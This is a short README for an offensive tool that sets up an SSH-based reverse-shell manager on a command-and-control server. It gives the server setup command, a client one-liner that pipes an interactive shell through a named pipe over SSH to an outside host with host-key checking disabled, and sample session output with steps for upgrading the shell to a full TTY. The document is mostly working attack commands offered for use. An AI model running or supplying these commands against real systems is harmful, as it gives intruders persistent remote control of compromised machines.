# SSHReverseShell
Script to setup a SSH reverse shell manager on a C2 server

1. Setup on the server
    ```bash
    ./sshshell.sh -a "<ssh id_rsa.pub>"
    ```
    ```
    Installing additional authorized principal rshell => ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOG+aXTDEM4k6Y/20s0NDZNWlmad+3nQotJYBBwqT7Ai/INV59WsSbQyL91W5y+30rMZQlXpk2UfVyxrFHCaEtUz3CXP/kkFsj862dgc3b8HeQM83GlHj6lZmpxihdVrNsQ7vn6uJTA9Wwo12fkGEXsN985ksofQR9s+rVIQJT3SAmJNhwbc8hDpunHl2sSRYil+kdVcCABNzKMUz5/3N6iB1DHzzYdgAIyZQ4+wmemUbBQ+clvqrVC2OdKl7h7WSEqgSp4IsHO0Bmo7ELqNYR1ORGk505dGGx62hbO5f7gciirRsH5EyptpBG3xYZxns4E5ont13l9GsL+Ok8ZH6N rshell@server
    ```

2. Connect from the client
    ```bash
    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <ssh id_rsa> -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@internal.server.com > /tmp/f; rm /tmp/f
    ```

3. Connect on the server
    ```bash
    ./sshshell.sh
    ```
    ```
    Connecting to 89.197.101.20_18000...
    Upgrade to a full TTY:
    * Launch a ptty:
      $ python -c 'import pty; pty.spawn("/bin/bash")'
      or
      $ script
    * Background the process (Ctrl+z)
    * Setup the environment:
      $ stty raw -echo
      $ fg
      $ reset; export SHELL=bash; export TERM=xterm-256color; stty rows 27 columns 204
    Connection to 127.0.0.1 18000 port [tcp/*] succeeded!
    sh: no job control in this shell
    sh-3.2$
    ```
